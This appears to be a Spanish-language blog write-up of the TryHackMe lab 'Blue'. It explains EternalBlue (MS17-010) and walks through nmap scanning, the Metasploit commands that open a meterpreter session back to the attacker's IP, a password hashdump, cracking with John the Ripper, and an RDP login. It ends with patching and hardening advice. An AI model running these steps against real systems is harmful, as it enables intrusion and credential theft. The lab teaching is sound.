---
title: "[🇪🇸] [WriteUp] - Blue (TryHackMe)"
excerpt: "Maquina EternalBlue, MS17-010, RCE Vulnerability "
date: "Mar 27 2025"
cover_image: "/blog/bluethm.webp"
alt: "Writeup 1"
tags1: "Hacking"
tags2: "Windows"
---

# Machine: Blue (TryHackMe)

&nbsp;

> *Difficulty Level: ⭐*

&nbsp;

Blue es una máquina con una vulnerabilidad en el protocolo SMB 445. EternalBlue permite la ejecución remota de código que fue descubierto en [MS17-010]

Resumen:

* Escaneo de puertos
* Explotación de vulnerabilidades (MS17-010 / EternalBlue)
* Shell remoto
* Escalada de privilegios a NT AUTHORITY\SYSTEM
* Volcado de hash de contraseñas usando Hashdump
* Hash cracking con John the Ripper
* Búsqueda de banderas

**Al final del informe te daré un resumen de toda la máquina, en inglés y español 🥳.**

**IMPORTANTE** Debes tener una máquina virtual o un sistema operativo de auditoría con privilegios de root y una conexión a Internet.

## Metodologia

* Reconocimiento
* Enumeración
* Búsqueda y análisis de vulnerabilidades
* Explotación
* Post-explotación

**Reconocimiento**: Responde a las preguntas ¿Qué se atacará? y ¿Qué formará
parte de la prueba?

**Enumeración**: Se recolecta toda información posible de lo que se atacará para
realizar la prueba sin contratiempos

**Búsqueda y análisis de vulnerabilidades**: Identifica debilidades sobre lo que se
atacará, puertos, procesos, servicios entre otros.

**Explotación**: Aquí se comienza con el ataque utilizando todo lo anterior y con las
herramientas correctas.

**Post explotación**: Se buscan posibles vulnerabilidades extra o que más se podrá
atacar.

**Reporte de las pruebas**: Se redacta todo lo que se va haciendo durante la
auditoria.

## ¿Qué es EternalBlue?

Eternal Blue es un exploit que supuestamente fue desarrollado por la Agencia de Seguridad Nacional de los Estados Unidos (NSA).
Este programa fue robado y luego filtrado por "The Shadow Brokers". Luego fue utilizado para ejecutar uno de los ataques de ransomware más dañinos de la historia, conocido como Wannacry.
El programa del virus eternal blue fue diseñado para explotar una vulnerabilidad registrada como *CVE-2017-0144*, que corresponde a una falla de seguridad en el protocolo Server Message Block de Microsoft (SMB).
El parche de seguridad para esta vulnerabilidad del virus eternal blue, llamado *MS17-010*, fue lanzado en marzo de 2017.
El uso del exploit eternal blue afectó principalmente a hospitales, estaciones de policía y, en general, a organizaciones de todo el mundo.

[Versions with MS17-010](https://support.microsoft.com/es-es/topic/c%C3%B3mo-comprobar-que-ms17-010-est%C3%A1-instalado-f55d3f13-7a9c-688c-260b-477d0ec9f2c8)
[CVE Versions](https://success.trendmicro.com/en-US/solution/KA-0008859)

&nbsp;

## Reconocimiento - Escaneo de puertos

Empecemos con la fase de reconocimiento.
Nuestra IP es *10.8.42.68* y el objetivo es *10.10.90.82*.

```powershell
ping -c 4 10.10.90.82
```

Comprobamos que el destino tiene activadas las peticiones ICMP.

```powershell
sudo su
```

```powershell
nmap 10.10.90.82 -p- -sV -oN all_ports.nmap -Pn --min-rate 5000
```

Windows suele utilizar un valor TTL por defecto entre 126 y 128. Linux y los sistemas tipo Unix suelen optar por un valor TTL por defecto entre 62 y 64.

Por lo tanto, inferimos que nos enfrentamos a una maquina con Windows como sistema operativo. Una vez identificado lo anterior procederemos a realizar un escaneo de puertos utilizando la herramienta nmap.

El escaneo de puertos nos permite identificar que servicios corren dentro del activo y así posteriormente identificar vulnerabilidades.

El puerto 445/tcp para microsoft-ds Windows 7 está abierto, este es el puerto por el que se va a explotar la vulnerabilidad.

&nbsp;

## Enumeración

Usando Nmap se usa el comando *nmap 10.10.90.82 -p- -sV -oN all_ports.nmap -Pn --min-rate 5000* donde las opciones son:

* *-p-*: Escanea todos los puertos (desde el 1 hasta el 65535).
* *-sV*: Detecta versiones de los servicios en los puertos abiertos.
* *-oN all_ports.nmap*: Guarda los resultados en un archivo llamado all_ports.nmap que puede ser leído más tarde.
* *-Pn*: Omite el escaneo de ping y asume que el host está activo.
* *--min-rate 5000*: Establece una tasa mínima de 5000 paquetes por segundo, acelerando el escaneo, (cabe aclarar que esto causa mucho ruido).

![EscaneoBlue.png](https://i.postimg.cc/XYTQptyK/scanblue.png)

Descubrimos que responde a JON-PC y confirmamos que utiliza Windows 7 como sistema operativo.

Gracias a este escaneo identificamos los puertos:

* **135/tcp (MSRPC)**: Relacionado con el servicio de RPC de Windows.
* **139/tcp (NetBIOS-SSN)**: Es utilizado para compartir archivos y dispositivos
en redes locales.
* **445/tcp (SMB)**: Al igual que NetBIOS permite compartir archivos, impresoras, directorios y otros recursos entre dispositivos en una red.
* **3389/tcp (RDP)**: El protocolo RDP permite la conexión remota a computadoras a través de una interfaz gráfica. Es fundamental para la administración remota.
* **49152-49160/tcp (MSRPC dinámico)**: Estos puertos están relacionados con la asignación dinámica de RPC.

&nbsp;

## Búsqueda y análisis de vulnerabilidades

De todos estos puertos descubiertos por Nmap podemos identificar como pueden ser explotados, por ejemplo:

* **135** responde a msrpc que puede ser explotado por ataques como **Pass the-Hash** o vulnerabilidades en el servicio DCOM, también se encuentran las *CVE-2023-24869*, *CVE-2023-24908*, *CVE-2023-23405* identificadas en 2023 que permiten la Ejecución remota de código (RCE).
* **139** responde a netbios-ssn que si contiene una misconfig este puede dar paso a ataques de **Enumeración de credenciales**.
* **445** responde a smb que puede ser explotado con **EternalBlue** o **SMBGhost** en ciertas versiones. Para Linux recientemente se encontró *CVE-2025-37899* descubierto por el modelo o3 de OpenAI.
* **3389** responde a rpd este permite ataques de **Fuerza Bruta** o vulnerabilidades como **BlueKeep** para la Ejecución remota de código, también se identifica la vulnerabilidad *CVE-2022-21990*, que permite la **Conexión sin autenticación**.  

**Se decide que el puerto 445 será el indicado a explotar.**

El puerto 445 aloja al protocolo SMB, este se encuentra en una maquina Windows,
nos damos cuenta de que este protocolo puede ser vulnerado usando EternalBlue o SMBGhost las cuales responde a CVE-2017-0144 y CVE-2020-0796 ambos usados por los ransomware WannaCry y NotPetya.

### ¿Qué es el Packet crafting?

El Packet Crafting es una técnica utilizada en ciberseguridad donde los paquetes son creados o manipulados manualmente para explotar vulnerabilidades en una red o sistema. Este método permite personalizar el tráfico de red para llevar a cabo diversas actividades maliciosas, como el reconocimiento de la red, ataques de denegación de servicio o la filtración de datos.

Técnica que hace uso de la manipulación o creación de paquetes TCP/IP para saltarse sistemas de seguridad o efectuar ataques de enmascaramiento (spoofing).

## Explotación

Comenzamos con el ataque ya conocida la vulnerabilidad, para este caso usaremos **Metasploit** con el exploit **EternalBlue**.

Dentro de metasploit buscaremos la vulnerabilidad EternalBlue basandonos en su Rank o Descripción.

```powershell
msfconsole

> search ms17-010

or 

> search eternalblue

> use exploit/windows/smb/ms17_010_eternalblue

or 

> use 0

> show options
```

Posteriormente configuraremos las opciones de *show options*, aqui se nos piden ciertos parametros obligatorios y otros opcionales para comenzar con el ataque.

Se procede a configurar los parámetros necesarios como la ip de activo y la ip atacante y el puerto.

![showoptions](https://i.postimg.cc/k5TQX1FP/shwop.png)

```powershell
> set RHOSTS 10.10.90.82
> set LPORT 65000
> set LHOST 10.8.42.68

> run
```

Finalizada la configuración procedemos con la ejecución del exploit, el objetivo es obtener una sesión de meterpreter.

![runBlue](https://i.postimg.cc/wBGz4Cn3/bluaat.png)

La sesión de meterpreter se ha iniciado por lo tanto el exploit funciono correctamente.
Nos damos cuenta que se trata de un Windows 7 Professional build 7601, la cual se ha descontinuado en actualizaciones en enero del 2020.

Podemos ver la lista de comandos los cuales hay muchas opciones que nos permiten interactuar con el activo, uno de ellos es **screenshare**.

![blueHelp](https://i.postimg.cc/L88rdytP/bluehlp.png)

![screenshare](https://i.postimg.cc/XqvwNyQs/scrteen.png)

![screenBlue3](https://i.postimg.cc/sD7pjycd/screen3.png)

Entonces decidimos invocar una terminal remota para poder interactuar con el activo.

Nos damos cuenta al ejecutar el comando whoami que somos el usuario **NT/AUTHORITY/SYSTEM**

## ¿Qué es el usuario NT/AUTHORITY/SYSTEM?

El usuario NT AUTHORITY\SYSTEM en Windows es una cuenta especial con privilegios elevados que permite a los servicios del sistema operar con acceso total a los recursos locales. Es más poderosa que cualquier cuenta de administrador estándar y se usa para ejecutar procesos críticos del sistema.

Esta cuenta no está asociada a un usuario y se emplea para tareas como la administración de archivos, la ejecución de servicios y el acceso a recursos protegidos. Similar al usuario root en Linux.

Usando PowerShell desde nuestras maquinas podemos listar los servicios que se ejecutan bajo esta cuenta:

```powershell
Get-WmiObject win32_service | select Name, StartName | Where-Object {($_.StartName -eq "LocalSystem")} 
```

## Post-Explotación

Ahora nos interesa tener persistencia o buscar las flags ocultas en el equipo, si bien podemos usar herramientas de busqueda avanzada o crear un nuevo usuario con privilegios de administración, decidimos usar el usuario existente en la maquina, JON.

Usando hashdump obtenemos el listado de los usuarios alojados en el sistema con su respectivo password.

![hashdump](https://i.postimg.cc/02PQgDpY/image.png)

Podemos usar herramientas online para descifrar el hash pero usaremos John The Ripper para descifrar contraseñas y el diccionario rockyou.txt encontramos que la contraseña para el usuario Jon es: **alqfna22**.

![johntheripper](https://i.postimg.cc/k4PVBZtZ/image.png)

Por ultimo, utilizando el protocolo RDP del puerto 3389 que observamos que está abierto durante la fase de enumeración nos conectamos usando rdesktop.
Conectandonos a la maquina Windows  nos damos cuenta que esta desactualizada, ya que esta en una actualización de windows 7 vieja y por lo tanto muy vulnerable, por eso mismo fue posible usar eternalblue de forma tan sencilla.

![desktop](https://i.postimg.cc/5NytN1Ry/image.png)

Encontramos la evidencia (la flag3) dentro de System32/config que es donde se guardan las contraseñas en Windows 7.

![flag3](https://i.postimg.cc/SNtcymmN/image.png)

## Recomendaciones

Como se ha notado a lo largo del informe el impacto de esta vulnerabilidad es critica por lo tanto se recomienda seguir ciertas recomendaciones.

1. Actualización:
a. Instalar el parche de seguridad que Microsoft a proporcionado MS17-010.
b. Instalar las actualizaciones disponibles de Windows Update.
2. Desactivar los protocolos innecesarios y/o vulnerables:
a. Desde Programas y características, “Activar o desactivar características de Windows”, desmarcar “Soporte para compartir archivos SMB 1.0/CIFS”
b. también se puede desactivar desde PowerShell usando el comando: *sc.exe config lanmanworkstation depend=bowser/mrxsmb10/mrxsmb20/nsi sc.exe config mrxsmb10 start= disabled*
3. Uso de Firewall
a. Configura reglas de entrada solo para las fuentes y puertos necesarios.
4. Desactivar o asegurar RDP
a. Desactivar el RDP en favor de “Solo conexiones con autenticación a nivel de red (NLA)”, Desde panel de control, Sistema, “Configuración de acceso remoto”.
b. Usar contraseñas fuertes y 2FA si es posible.
5. Utilizar alguna herramienta de monitoreo o SIEM/SOAR.

### Estandar

Se recomienda seguir el estándar NIST, específicamente NIST SP 800-53 y NIST SP 800-171.

* NIST SP 800-53: Es un catalogo de controles de seguridad que cubren lo necesario respecto a protección de sistemas.
    o Limita quien puede acceder a que (control de acceso).
    o Restringe servicios innecesarios (reducción de superficie de ataque).
    o Asegura la configuración del sistema (hardening)
    o Aplica parches a tiempo (gestión de vulnerabilidades).
    o Protege y supervisa.
    o Documenta y responde a incidentes
* NIST SP 800-171: Se enfoca a proteger información en sistemas de empresas.
    o Autenticación fuerte
    o Configuraciones seguras en los equipos.

## Fuentes de consulta

* P. José Luis / Madrid, España. (n.d.). Packet crafting - GTI - Glosario Terminología informatica. T U G U R I U M. <https://www.tugurium.com/gti/termino.php?Tr=packet%20crafting>
* What is packet crafting? (2025, May 22). IT Certification Boot Camp Courses | Master IT Certifications Fast – Training Camp. <https://trainingcamp.com/glossary/packet-crafting/>
* <https://nvd.nist.gov/vuln/detail/cve-2017-0144>
* <https://nvd.nist.gov/vuln/detail/CVE-2025-29927>

### Glosario de Hacking Ciberseguridad y Redes

Recomiendo revisar mi articulo sobre esto para poder entender de mejor los terminos de este writeup.

🍁 Glosario de terminos [--> Glosario](https://aiskoa.vercel.app/es/blog/glossary)

---

&nbsp;
s
> Gracias por dleer mi blog, espero que te haya gustado.

&nbsp;

* 💜 Acceso a más writeups [--> WriteUps](https://aiskoa.vercel.app/writeup)
